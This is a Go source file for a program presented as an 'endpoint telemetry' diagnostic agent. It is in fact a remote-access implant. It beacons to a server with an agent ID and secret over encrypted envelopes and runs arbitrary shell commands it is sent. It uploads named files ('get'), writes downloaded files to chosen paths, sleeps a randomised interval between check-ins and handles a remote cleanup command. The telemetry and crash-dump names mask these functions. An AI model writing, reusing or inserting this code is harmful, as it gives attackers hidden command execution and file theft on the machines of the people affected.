package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"

	"endpoint-telemetry/funcs"
)

type DeviceTelemetryPayload struct {
	EndpointID  string `json:"agent_id"`
	AgentSecret string `json:"agent_secret"`
	Hostname    string `json:"hostname"`
	OS          string `json:"os"`
}

type SyncResponse struct {
	Status string          `json:"status"`
	Jobs   []DiagnosticJob `json:"tasks"`
}

type DiagnosticJob struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
	Type    string `json:"type"`
}

type DiagnosticOutput struct {
	JobID       int    `json:"task_id"`
	EndpointID  string `json:"agent_id"`
	AgentSecret string `json:"agent_secret"`
	ReportID    string `json:"report_id"`
	Output      string `json:"output"`
}

type ResultAcknowledgement struct {
	Status          string `json:"status"`
	EndpointID      string `json:"agent_id"`
	JobID           int    `json:"task_id"`
	ReportID        string `json:"report_id"`
	OutputSHA256    string `json:"output_sha256"`
	AlreadyRecorded bool   `json:"already_recorded"`
}

func main() {
	if err := acquireAgentProcessLock(); err != nil {
		return
	}
	defer func() { _ = releaseAgentProcessLock(false) }()

	InitializeTelemetry()
	if err := initializeDurableResultState(); err != nil {
		return
	}
	if resumePendingCleanup() {
		return
	}

	hostname, _ := os.Hostname()
	agentOS := runtime.GOOS

	for {
		retryQueuedResults()
		jobs, err := SyncDeviceState(hostname, agentOS)
		if err != nil {
			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
			continue
		}

		for _, job := range jobs {
			if job.Command == FlushCommand {
				submitResultWithRetry(job.ID, "Cache flush acknowledged. Cleaning up...", true)
				continue
			}

			// cd runs synchronously so the updated working directory is visible to the next job
			if funcs.IsPathUpdate(job.Command) {
				output, cdErr := funcs.ExecuteDiagnosticTask(job.Command)
				if cdErr != nil {
					output = fmt.Sprintf("Error: %v", cdErr)
				}
				submitResultWithRetry(job.ID, output, false)
				continue
			}

			if strings.HasPrefix(job.Command, "get ") {
				go func(t DiagnosticJob) {
					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, AgentSecret, filePath, KeyID, EncryptionKey)
					if err != nil {
						output = fmt.Sprintf("Upload error: %v", err)
					}
					submitResultWithRetry(t.ID, output, false)
				}(job)
				continue
			}

			if strings.HasPrefix(job.Command, "download ") {
				go func(t DiagnosticJob) {
					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
					parts := strings.SplitN(args, " ", 2)
					if len(parts) != 2 {
						submitResultWithRetry(t.ID, "Usage: download <file_id> <save_path>", false)
						return
					}
					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]), EndpointID, AgentSecret, t.ID)
					if err != nil {
						output = fmt.Sprintf("Download error: %v", err)
					}
					submitResultWithRetry(t.ID, output, false)
				}(job)
				continue
			}

			go func(t DiagnosticJob) {
				var output string
				var execErr error

				switch t.Type {
				case "exec":
					output, execErr = funcs.RunDiagnosticProbe(t.Command)
				default:
					// "shell" or missing type -- backward compatible
					output, execErr = funcs.ExecuteDiagnosticTask(t.Command)
				}

				if execErr != nil && output == "" {
					output = fmt.Sprintf("Error: %v", execErr)
				}
				submitResultWithRetry(t.ID, output, false)
			}(job)
		}

		funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
	}
}

func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {
	payload := DeviceTelemetryPayload{
		EndpointID:  EndpointID,
		AgentSecret: AgentSecret,
		Hostname:    hostname,
		OS:          agentOS,
	}

	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathCheckin, payload)
	if err != nil {
		return nil, err
	}

	// Unwrap the encrypted response envelope
	var envelope struct {
		Data string `json:"data"`
	}
	if err := json.Unmarshal(respBody, &envelope); err != nil {
		return nil, fmt.Errorf("envelope unmarshal: %w", err)
	}

	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
	if err != nil {
		return nil, fmt.Errorf("decrypt checkin response: %w", err)
	}

	var result SyncResponse
	if err := json.Unmarshal(plain, &result); err != nil {
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}
	return result.Jobs, nil
}

func SubmitDiagnosticReport(jobID int, output, reportID string) error {
	// encoding/json replaces invalid UTF-8 in strings. Normalize first so the
	// payload and the acknowledgement digest always describe identical bytes.
	output = string([]rune(output))
	payload := DiagnosticOutput{
		JobID:       jobID,
		EndpointID:  EndpointID,
		AgentSecret: AgentSecret,
		ReportID:    reportID,
		Output:      output,
	}
	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
	if err != nil {
		return err
	}

	var envelope struct {
		KeyID string `json:"kid"`
		Data  string `json:"data"`
	}
	if err := json.Unmarshal(respBody, &envelope); err != nil {
		return fmt.Errorf("result acknowledgement envelope: %w", err)
	}
	if envelope.KeyID != KeyID || envelope.Data == "" {
		return fmt.Errorf("result acknowledgement envelope does not match this build")
	}

	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
	if err != nil {
		return fmt.Errorf("authenticate result acknowledgement: %w", err)
	}
	var acknowledgement ResultAcknowledgement
	if err := json.Unmarshal(plain, &acknowledgement); err != nil {
		return fmt.Errorf("decode result acknowledgement: %w", err)
	}
	digest := sha256.Sum256([]byte(output))
	expectedDigest := hex.EncodeToString(digest[:])
	if acknowledgement.Status != "ok" ||
		acknowledgement.EndpointID != EndpointID ||
		acknowledgement.JobID != jobID ||
		acknowledgement.ReportID != reportID ||
		acknowledgement.OutputSHA256 != expectedDigest {
		return fmt.Errorf("result acknowledgement does not match the submitted result")
	}
	return nil
}

// transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
// wraps the ciphertext in a {kid, data} envelope, and POSTs it.
// Returns the raw response body so the caller can decrypt if needed.
func transmitSecureTelemetry(url string, payload any) ([]byte, error) {
	inner, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("marshal: %w", err)
	}

	enc, err := funcs.SealTelemetry(EncryptionKey, inner)
	if err != nil {
		return nil, fmt.Errorf("encrypt: %w", err)
	}

	envelope := map[string]string{"kid": KeyID, "data": enc}
	body, err := json.Marshal(envelope)
	if err != nil {
		return nil, fmt.Errorf("envelope marshal: %w", err)
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil, fmt.Errorf("post: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != 200 {
		bodyStr := string(respBody)
		if resp.StatusCode == 410 ||
			(resp.StatusCode == 403 && strings.Contains(bodyStr, "Invalid agent identity")) {
			return nil, &errAgentIdentityGone{StatusCode: resp.StatusCode, Body: bodyStr}
		}
		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, bodyStr)
	}

	return respBody, nil
}
